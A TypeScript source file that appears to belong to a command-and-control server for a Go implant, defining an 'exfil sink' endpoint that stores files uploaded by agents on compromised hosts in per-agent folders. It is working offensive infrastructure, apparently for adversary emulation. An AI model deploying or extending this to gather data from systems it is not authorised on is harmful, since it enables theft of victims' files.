import type { IncomingMessage, ServerResponse } from "node:http";
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { config } from "../config.js";
import { header, json, readBody, text } from "../http.js";

/**
 * Exfil sink. The agent POSTs collected files here as multipart form data (one
 * "file" field, see `gocat/contact/api.go:createUploadForm`); without this
 * endpoint the agent's upload path errors out. The paw comes from the
 * X-Request-Id header, which the agent sets to "<host>-<paw>".
 */
export async function handleUpload(req: IncomingMessage, res: ServerResponse): Promise<void> {
  const maxBytes = config.C2_MAX_UPLOAD_MB * 1024 * 1024;
  try {
    let body: Buffer;
    try {
      body = await readBody(req, maxBytes);
    } catch {
      text(res, 413, "upload too large");
      return;
    }

    // Node's global Response parses multipart/form-data the same way the Web
    // Request.formData() did in the Next.js route, with no added dependency.
    const form = await new Response(body, {
      headers: { "content-type": header(req, "content-type") },
    }).formData();

    const paw = (header(req, "X-Request-Id") || "unknown").replace(/[^a-zA-Z0-9_-]/g, "");
    const target = path.join(config.C2_EXFIL_DIR, paw || "unknown");
    await mkdir(target, { recursive: true });

    let saved = 0;
    for (const value of form.values()) {
      if (typeof value === "string" || !("arrayBuffer" in value)) continue;
      const filename = path.basename(value.name || `upload-${Date.now()}`);
      await writeFile(path.join(target, filename), Buffer.from(await value.arrayBuffer()));
      saved += 1;
    }

    json(res, 200, { saved });
  } catch (error) {
    console.error("[c2] exfil upload failed:", error);
    text(res, 500, "upload failed");
  }
}
